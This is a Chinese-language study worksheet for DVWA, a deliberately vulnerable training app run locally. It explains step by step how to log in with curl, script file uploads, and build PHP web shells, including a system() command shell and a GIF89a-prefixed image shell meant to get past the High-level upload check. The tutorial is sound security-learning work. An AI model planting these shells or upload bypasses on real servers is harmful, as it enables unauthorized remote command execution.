# 11/20 晚上执行手册（每条命令 + 原理 + 预期）

> 白天看这一份，把命令和"它为什么这么写"抄下来。
> 晚上照着敲，不用再想。

---

# 第 0 步：一次性准备（5 分钟）

> 重启过的话 `/tmp` 会清空，变量也会丢。所以每次坐下先跑这一段。

## 0.1 登录，把 cookie 存下来

```bash
cd /tmp
rm -f c.txt
LT=$(curl -s -c c.txt http://127.0.0.1:4280/login.php | grep -oP "name='user_token' value='\K[^']+")
```

**逐项：**

`cd /tmp` 把工作目录切到 /tmp，后面文件都放这。

`rm -f c.txt` 删掉旧 cookie 文件。`-f` 表示"不存在也别报错"。

`curl -s -c c.txt 网址` 访问登录页。`-c` 是把服务器给的 cookie **写进** c.txt，`-s` 是不打印进度条。

`| grep -oP "..."` 从上一步的 HTML 里用正则抠出 token。`-o` 只输出匹配部分，`-P` 启用 Perl 正则，`\K` 意思是"前面的别看，从这里开始算"。

`LT=$(...)` 把结果存进变量 LT。

## 0.2 带着 token 登录

```bash
curl -s -b c.txt -c c.txt -d "username=admin&password=password&Login=Login&user_token=$LT" http://127.0.0.1:4280/login.php -o /dev/null
```

**逐项：**

`-b c.txt` **b 是 brought**，把 cookie 带上去。

`-c c.txt` **c 是 cookie jar**，把新收到的 cookie 存回去。

`-d "..."` **d 是 data**，把这段当表单 POST 出去。

`&` 分隔多个字段。

`-o /dev/null` 响应丢进黑洞，不打印。

## 0.3 取出 session id，拼成 cookie 字符串

```bash
SID=$(grep PHPSESSID c.txt | awk '{print $7}')
CK="PHPSESSID=$SID; security=low"
echo "$CK"
```

**为什么这么麻烦：**

cookie 文件那一行长这样：

```
127.0.0.1	FALSE	/	FALSE	0	PHPSESSID	a6fd1b34...
```

第 7 列（空格分开）就是 session id 的值。`awk '{print $7}'` 就是取第 7 列。

**为什么要把难度拼进 cookie：**

因为 DVWA 的难度是存在 **cookie** 里的（你前天看到 `Set-Cookie: security=impossible`）。curl 每次新开会话默认是 `impossible`，不拼上去什么都传不成功。

`echo "$CK"` 会打印出：

```
PHPSESSID=a6fd1b34...; security=low
```

**必须有内容。空了就说明前面登录没成。**

## 0.4 装一个"上传器"

```bash
cat > /tmp/up.sh << 'SCRIPT'
#!/bin/bash
cd /tmp
SID=$(grep PHPSESSID c.txt | awk '{print $7}')
CK="PHPSESSID=$SID; security=$2"
TOK=$(curl -s -H "Cookie: $CK" http://127.0.0.1:4280/vulnerabilities/upload/ | grep -oP "name='user_token' value='\K[^']+")
curl -s -H "Cookie: $CK" -F "uploaded=@/tmp/$1;type=${3:-image/jpeg}" -F "user_token=$TOK" -F "Upload=Upload" http://127.0.0.1:4280/vulnerabilities/upload/ | grep -oE "(succesfully uploaded|was not uploaded|Your image|Sorry)[^<]*"
SCRIPT
```

**以后上传只要一句：**

```bash
bash /tmp/up.sh 文件名 难度 [MIME]
```

**逐项拆这个脚本：**

`$1` 是第一个参数（文件名）。
`$2` 是第二个参数（难度：low / medium / high）。
`${3:-image/jpeg}` 是第三个参数（MIME），**没给就用默认值 `image/jpeg`**。这就是 `${变量:-默认值}` 语法。

`TOK=` 那一行每次重新取 token，因为 token 是一次性的，上传一次就换。

`-H "Cookie: $CK"` **H 是 header**，手动塞请求头。为什么不用 `-b 文件`：因为要同时带 session 和难度两样，`-b` 只接一个来源。

`-F "uploaded=@/tmp/$1;type=..."` **F 是 form**：
- `uploaded=` 字段名（DVWA 定的）
- `@/tmp/xxx` 的 `@` 表示读这个本地文件当内容
- `;type=` 就是伪造 Content-Type

`| grep -oE "(...)[^<]*"` 从响应 HTML 里只抠出含这几个关键词的那一行，别的一大堆都不要。

---

# 第 1 题：证明 echo 和 system 是两回事

**原理（先看再敲）：**

`echo` 是语言结构，只往输出缓冲区写字符串，**不起子进程、不执行任何外部程序**。

`system` 会 `fork()` 一个子进程，`execve("/bin/sh", "-c", 你的参数)`，子进程的 stdout 直连 PHP 输出流，所以命令结果直接出现在响应里。

**所以：**
- `echo($_GET["c"])` 传 `whoami`，输出是 `whoami` 这个**字符串**
- `system($_GET["c"])` 传 `whoami`，输出是 `www-data` 这个**命令结果**

## 1.1 造两个木马

```bash
echo -n '<?php echo "ECHO:" . $_GET["c"]; ?>' > /tmp/t_echo.php
echo -n '<?php system($_GET["c"]); ?>' > /tmp/t_sys.php
```

**逐项：**

`echo -n` 是 Linux 的 echo，`-n` 表示**结尾不加换行**。为什么：PHP 标签前后多一个换行没影响，但保持干净。

`'...'` 单引号里的东西原样写入，不解释变量。**这里必须用单引号**，否则 bash 会把 `$` 当变量。

`> 文件` 覆盖写入。

## 1.2 上传（难度用 low，先排除检测干扰）

```bash
bash /tmp/up.sh t_echo.php low
bash /tmp/up.sh t_sys.php low
```

**预期：** 两行都显示 `succesfully uploaded`。

## 1.3 访问，看差别

```bash
curl -s "http://127.0.0.1:4280/hackable/uploads/t_echo.php?c=whoami"
curl -s "http://127.0.0.1:4280/hackable/uploads/t_sys.php?c=whoami"
```

**预期：**

第一行显示 `ECHO:whoami`
第二行显示 `www-data`

**这一题说明什么：**

同样一个参数 `c=whoami`，`echo` 把它当**文本**输出，`system` 把它当**命令**执行。

**这就是"传参"和"命令执行"的分界线。**

---

# 第 2 题：证明 exec 不输出

**原理：**

`exec()` 和 `system()` 一样会执行命令，但**它不把输出打到响应里**，而是存进你给的那个数组变量。

`exec($_GET["c"], $o)` 的意思是：执行命令，把输出的每一行放进数组 `$o`。

**你不把它取出来打印，就什么都看不到。**

## 2.1 造两个

```bash
echo -n '<?php exec($_GET["c"], $o); ?>' > /tmp/t_exec.php
echo -n '<?php exec($_GET["c"], $o); echo implode("\n", $o); ?>' > /tmp/t_exec2.php
```

**`implode("\n", $o)` 是什么：**

把数组 `$o` 的每个元素用换行符连成一个字符串。

比如 `$o = ["www-data"]`，`implode` 之后是 `"www-data"`。

如果有三行输出，就是 `"第一行\n第二行\n第三行"`。

## 2.2 上传

```bash
bash /tmp/up.sh t_exec.php low
bash /tmp/up.sh t_exec2.php low
```

## 2.3 访问

```bash
curl -s "http://127.0.0.1:4280/hackable/uploads/t_exec.php?c=whoami"
curl -s "http://127.0.0.1:4280/hackable/uploads/t_exec2.php?c=whoami"
```

**预期：**

第一条：**空白**（命令执行了，但结果没输出）
第二条：显示 `www-data`

**这一题说明什么：**

**函数执行了，不等于你看得到。** 这也是为什么真实环境里"无回显"要单独解决。

---

# 第 3 题：High 关，图片马

**原理：**

High 会调 `getimagesize()`，它**只读文件前 12 个字节**判断格式。

GIF 的魔数是 `GIF89a`（6 个字节）。只要文件开头是这六个字符，`getimagesize` 就认为它是合法 GIF。

**后面的内容它不管。**

所以：`GIF89a` + php 代码 = 一个"看起来是 GIF"的木马。

## 3.1 造 GIF 马

```bash
echo -n 'GIF89a<?php echo "PWNED:" . $_GET["c"]; ?>' > /tmp/shell.gif
xxd /tmp/shell.gif | head -3
```

**逐项：**

`echo -n '...'` 整段一次写完，不加换行。

`xxd` 是十六进制查看器，用来**确认文件开头真的是 `GIF89a`**。

**预期输出：**

```
00000000: 4749 4638 3961 3c3f 7068 7020 6563 686f  GIF89a<?php echo
```

看到 `4749 4638 3961` 就对了——这是 `GIF89a` 的十六进制。

## 3.2 切到 High 上传

```bash
bash /tmp/up.sh shell.gif high
```

**三种可能：**

`succesfully uploaded` → 过了 magic bytes 这层
`Your image was not uploaded` → 被拦了，可能是别的检查
`Sorry, ...` → 看报错原文

## 3.3 验证文件真的在服务器上

```bash
docker exec dvwa-dvwa-1 ls -l /var/www/html/hackable/uploads/
```

**为什么要这一步：**

因为"上传成功"和"文件存在"是两件事。**先确认文件在，再谈能不能执行。**

## 3.4 看 payload 还在不在

```bash
docker exec dvwa-dvwa-1 head -c 60 /var/www/html/hackable/uploads/shell.gif
```

**`head -c 60` 是只读前 60 个字节。**

**预期：** 能看到 `GIF89a<?php echo "PWNED:"...`

**如果看到的是图片乱码、payload 不见了** → 说明被二次渲染了，那就是 Impossible 的行为。

## 3.5 尝试执行

```bash
curl -s "http://127.0.0.1:4280/hackable/uploads/shell.gif?c=high"
```

**预期：** 大概率返回文件的原始内容（因为 `.gif` 不在 `FilesMatch` 里），而不是 `PWNED:high`。

**这是正常的。** 上传成功不等于能执行，这就是你前天已经学会的区分。

**真要执行，三条路：**

一，配 `.htaccess`（如果目录允许）
二，改 `FilesMatch` 加上 gif（又是作弊）
三，用文件包含（LFI）去包含它——**这是明天之后的主线**

---

# 第 4 题：看 High 的源码

**不用命令，浏览器操作。**

DVWA Security 切 **High** → 左侧 File Upload → 右下角 **View Source**。

**把这两段抄下来：**

```php
$uploaded_ext = ...;
if (!($uploaded_ext == "jpg" || ...)) { ... }

$size = getimagesize(...);
if (!$size) { ... }
```

**看完你会发现：** High 到底检查了几样东西，跟我讲的是不是一样。

**如果不一致，以源码为准，我的说法作废。**

---

# 附：如果卡住了，按这个顺序查

**症状一：上传返回空白**

```bash
echo "CK=$CK"
```

CK 空 → 回到第 0 步重来。

**症状二：`login token:` 是空的**

```bash
curl -s http://127.0.0.1:4280/login.php | grep -i token
```

看得见 token 但抠不到 → 正则和页面结构不匹配，把输出发我看。

**症状三：访问 404**

```bash
docker exec dvwa-dwva-1 ls -l /var/www/html/hackable/uploads/
```

（注意容器名，别打错）

**症状四：访问返回源码**

说明后端不认这个后缀。去看 `FilesMatch`：

```bash
docker exec dvwa-dvwa-1 cat /etc/apache2/conf-available/docker-php.conf
```

---

# 附：明天晚上的时间表

| 时间 | 做什么 |
|---|---|
| 22:40-22:50 | 第 0 步准备，`echo "$CK"` 确认有值 |
| 22:50-23:10 | 第 1 题 echo vs system |
| 23:10-23:25 | 第 2 题 exec |
| 23:25-23:45 | 第 3 题 GIF 马 + High |
| 23:45-23:55 | View Source 抄源码 |
| 23:55-00:05 | 记三行结论 |

**做不完就停，明天的题后天做也一样。**
